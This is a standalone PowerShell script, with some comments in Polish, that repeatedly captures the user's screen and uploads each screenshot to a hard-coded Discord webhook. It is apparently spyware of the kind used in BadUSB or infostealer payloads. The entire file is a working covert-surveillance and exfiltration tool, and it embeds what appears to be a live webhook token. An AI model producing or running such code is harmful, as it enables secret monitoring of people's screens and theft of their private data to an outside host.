# Set your Discord webhook URL
$discordWebhook = "https://discord.com/api/webhooks/1250405440760713288/fl-mgc3vYS1ftp3KUjiMRql6O9h9PqGH_3NhLj5KGB4Ru5MkQkuImcRzj-SP7BJ_ClL1"

# Edit these variables as needed
$numberOfScreenshots = 10
$screenshotInterval = 5
Set-Location -Path $env:TEMP
for ($i = 0; $i -lt $numberOfScreenshots; $i++) {
    Start-Sleep -Seconds $screenshotInterval

    # Take a screenshot
    Add-Type -AssemblyName System.Windows.Forms
    $screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screenshot.Width, $screenshot.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size)
    $bitmap.Save("$env:TEMP\screenshot$i.png")

    # Send the screenshot via Discord webhook
    
    # Odczytaj zawartość pliku
    $filename="$env:TEMP\screenshot$i.png"
    $fileContent = [System.IO.File]::ReadAllBytes($filename)
    $fileBase64 = [Convert]::ToBase64String($fileContent)

    # Utwórz żądanie do Discorda
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $bodyLines = @()
    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""
    $bodyLines += ""
    $bodyLines += "{`"content`": `"Oto Twoje zdjęcie!`"}"
    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"file1`"; filename=`"$($filename | Split-Path -Leaf)`""
    $bodyLines += "Content-Type: application/octet-stream"
    $bodyLines += ""
    $bodyLines += $fileBase64
    $bodyLines += "--$boundary--"

    $body = $bodyLines -join $LF
    Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
}
